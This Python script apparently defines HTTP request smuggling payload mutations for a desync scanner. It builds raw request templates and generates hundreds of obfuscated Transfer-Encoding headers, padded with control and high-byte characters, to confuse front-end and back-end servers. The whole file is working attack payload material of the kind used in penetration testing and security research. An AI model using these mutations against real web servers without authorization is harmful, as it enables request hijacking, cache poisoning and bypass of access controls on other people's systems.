
def render_template(gadget):
	RN = "\r\n"
	p = Payload()
	p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN
	p.header += gadget + RN
	p.header += "Host: __HOST__" + RN
	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
	p.header += "Content-Length: __REPLACE_CL__" + RN
	return p

for i in range(0x1,0x21):
	mutations["%02x-%02x-XX-XX"%(i,i)] = render_template("%cTransfer-Encoding%c: chunked"%(i,i))
	mutations["%02x-XX-%02x-XX"%(i,i)] = render_template("%cTransfer-Encoding:%cchunked"%(i,i))
	mutations["%02x-XX-XX-%02x"%(i,i)] = render_template("%cTransfer-Encoding: chunked%c"%(i,i))
	mutations["XX-%02x-%02x-XX"%(i,i)] = render_template("Transfer-Encoding%c:%cchunked"%(i,i))
	mutations["XX-%02x-XX-%02x"%(i,i)] = render_template("Transfer-Encoding%c: chunked%c"%(i,i))
	mutations["XX-XX-%02x-%02x"%(i,i)] = render_template("Transfer-Encoding:%cchunked%c"%(i,i))
	
for i in range(0x7F,0x100):
	mutations["%02x-%02x-XX-XX"%(i,i)] = render_template("%cTransfer-Encoding%c: chunked"%(i,i))
	mutations["%02x-XX-%02x-XX"%(i,i)] = render_template("%cTransfer-Encoding:%cchunked"%(i,i))
	mutations["%02x-XX-XX-%02x"%(i,i)] = render_template("%cTransfer-Encoding: chunked%c"%(i,i))
	mutations["XX-%02x-%02x-XX"%(i,i)] = render_template("Transfer-Encoding%c:%cchunked"%(i,i))
	mutations["XX-%02x-XX-%02x"%(i,i)] = render_template("Transfer-Encoding%c: chunked%c"%(i,i))
	mutations["XX-XX-%02x-%02x"%(i,i)] = render_template("Transfer-Encoding:%cchunked%c"%(i,i))